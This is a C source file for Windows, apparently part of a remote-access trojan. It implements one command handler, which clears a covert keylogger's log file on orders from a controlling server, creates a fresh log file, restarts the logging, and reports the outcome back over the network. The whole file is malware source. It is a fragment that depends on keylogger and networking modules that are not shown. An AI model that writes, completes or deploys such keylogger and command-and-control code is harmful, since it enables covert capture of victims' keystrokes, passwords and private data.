#include <stdio.h>
#include <windows.h>
#include "commands/cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"
#include "keylogger/keylogger.h"

#define SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NOT_ACTIVE 1
#define SERV_CMDS_KEYLOGGER_CLEAR_FAILED_DELETE 2
#define SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NEW_PATH 3

int cmds_KEYLOGGER_CLEAR(void)
{
	if(!keylogger_IsRunning)
	{
		if(net_SendEmptyCmd(SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NOT_ACTIVE) < 1)
		{
			return 0;
		}

		return 1;
	}

	keylogger_IsBlocking = 1;
	KEYLOGGER_BLOCK_CPU_PROTECT();

	fclose(keylogger_F);

	if(remove(keylogger_FilePath) == -1)
	{
		keylogger_F = fopen(keylogger_FilePath, "a+");
		keylogger_IsBlocking = 0;

		if(net_SendEmptyCmd(SERV_CMDS_KEYLOGGER_CLEAR_FAILED_DELETE) < 1)
		{
			return 0;
		}

		return 1;
	}

	int i;
	
	for(i = 0; i != 10; i++)
	{
		if(keylogger_GetFile()) //find keyloger data by sigil or create a new one
		{
			break;
		}
	}

	if(!keylogger_F)
	{
		keylogger_F = fopen(keylogger_FilePath, "a+");
		keylogger_IsBlocking = 0;

		if(net_SendEmptyCmd(SERV_CMDS_KEYLOGGER_CLEAR_FAILED_NEW_PATH) < 1)
		{
			return 0;
		}

		return 1;
	}
	
	keylogger_Setup();
	keylogger_IsBlocking = 0;

	if(net_SendEmptyCmd(CMDS_KEYLOGGER_CLEAR) < 1)
	{
		return 0;
	}

	return 1;
}